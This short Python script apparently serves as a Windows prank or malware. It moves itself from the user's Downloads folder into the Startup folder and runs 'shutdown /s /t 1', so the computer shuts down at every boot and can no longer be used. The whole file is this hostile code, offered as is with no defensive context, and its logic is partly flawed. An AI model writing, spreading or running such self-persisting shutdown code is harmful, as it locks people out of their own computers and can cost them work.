import getpass
import shutil
import os
import pathlib

currentPath = str(pathlib.Path().resolve()) + '\\' + 'main.py'
user = getpass.getuser()
original = fr'C:\Users\{user}\Downloads\main.py'
new = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.py'


if currentPath is not new:
    os.system("shutdown /s /t 1")
    shutil.move(original, new)
os.system("shutdown /s /t 1")